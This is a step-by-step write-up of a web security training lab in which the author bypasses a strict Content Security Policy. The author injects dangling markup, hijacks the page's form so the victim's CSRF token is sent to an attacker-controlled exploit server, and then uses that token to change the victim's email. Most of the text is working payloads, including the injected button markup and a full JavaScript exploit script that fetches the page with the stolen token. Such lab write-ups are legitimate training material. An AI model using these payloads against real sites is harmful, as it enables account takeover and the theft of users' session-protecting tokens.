# **Reflected XSS protected by very strict CSP, with dangling markup attack**

Task: This lab uses a strict CSP that prevents the browser from loading subresources from external domains.

To solve the lab, perform a form hijacking attack that bypasses the CSP, exfiltrates the simulated victim user's CSRF token, and uses it to authorize changing the email to hacker@evil-user.net.

You must label your vector with the word "Click" in order to induce the simulated user to click it. For example:  
\<a href=""\>Click me\</a\>

You can log in to your own account using the following credentials: wiener:peter

Toolkit: Burpsuite, Browser

1. explore our account and found out that email is query string  
2. try to inject asdf@asdf”\>AAAAA

RESP: \<input required type="email" name="email" value="asdf@asdf\>AAAAA"\>

3. add our exploit server asdf@asdf”\>\<button%20formaction="[https\://exploit-0a6f000e03f704e5802c116601e10059.exploit-server.net/exploit](https://exploit-0a6f000e03f704e5802c116601e10059.exploit-server.net/exploit)"\>Clickme\</button\>   
4. click the button? but url do not contain TOKEN [https\://exploit-0a6f000e03f704e5802c116601e10059.exploit-server.net/exploit](https://exploit-0a6f000e03f704e5802c116601e10059.exploit-server.net/exploit)  
5. add formmethod to see GET req

asdf@asdf.com"\>\<button%20formaction="[https\://exploit-0a6f000e03f704e5802c116601e10059.exploit-server.net/exploit"formmethod="get](https://exploit-0a6f000e03f704e5802c116601e10059.exploit-server.net/exploit"formmethod="get)"\>clickme\</button\>

URL: [https\://exploit-0a6f000e03f704e5802c116601e10059.exploit-server.net/exploit?email=asdf%40asdf.com\&csrf=ZPwOMiqLjrh2xDK85gGmdiC1boTgEZu5](https://exploit-0a6f000e03f704e5802c116601e10059.exploit-server.net/exploit?email=asdf%40asdf.com&csrf=ZPwOMiqLjrh2xDK85gGmdiC1boTgEZu5)

6. go to exploit server and write down a script

\<script\>  
const csrf \= new URL(location).searchParams.get('csrf');

if (csrf) {  
    fetch('https\://0a720089036f041d80ed12cb00de006b.web-security-academy.net/my-account/change-email', {  
        method: 'POST',  
        credentials: 'include',  
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},  
        body: \`email=hacker@evil-user.net\&csrf=\${csrf}\`  
    });  
} else {  
    location \= 'https\://0a720089036f041d80ed12cb00de006b.web-security-academy.net/my-account?email=asd@asd.com%22%3E%3Cbutton%20formaction=%22https://exploit-0a6f000e03f704e5802c116601e10059.exploit-server.net/exploit%22%20formmethod=get%3EClick%20me%3C/button%3E';  
}  
\</script\>

Done\!